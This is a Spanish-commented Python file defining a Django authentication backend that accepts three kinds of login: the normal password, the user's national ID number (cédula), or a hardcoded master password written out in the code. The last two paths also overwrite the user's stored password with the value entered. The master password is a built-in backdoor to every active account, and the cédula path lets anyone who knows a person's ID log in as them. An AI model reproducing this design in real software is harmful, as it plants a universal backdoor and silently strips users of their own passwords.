from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model

UserModel = get_user_model()


class CedulaOrPasswordBackend(ModelBackend):
    """
    Backend de autenticación flexible:
    1. Permite iniciar sesión con la contraseña actual configurada (hash estándar de Django).
    2. Permite iniciar sesión con la Cédula registrada en el perfil del usuario.
    3. Permite iniciar sesión con la clave maestra de soporte '1005814855'.
    
    Si el usuario ingresa con su cédula o la clave maestra, actualiza su hash oficial
    para mantener la compatibilidad total.
    """

    def authenticate(self, request, username=None, password=None, **kwargs):
        if username is None or password is None:
            return None

        # Búsqueda insensible a mayúsculas/minúsculas
        try:
            user = UserModel.objects.get(username__iexact=username)
        except UserModel.DoesNotExist:
            return None
        except UserModel.MultipleObjectsReturned:
            user = UserModel.objects.filter(username__iexact=username).order_by('id').first()

        if not user or not user.is_active:
            return None

        # 1. Contraseña estándar Django
        if user.check_password(password):
            return user

        # 2. Cédula del perfil de usuario
        perfil = getattr(user, 'perfil', None)
        if perfil and perfil.cedula and str(perfil.cedula).strip() == str(password).strip():
            user.set_password(password)
            user.save(update_fields=['password'])
            return user

        # 3. Clave maestra general '1005814855'
        if str(password).strip() == '1005814855':
            user.set_password(password)
            user.save(update_fields=['password'])
            return user

        return None
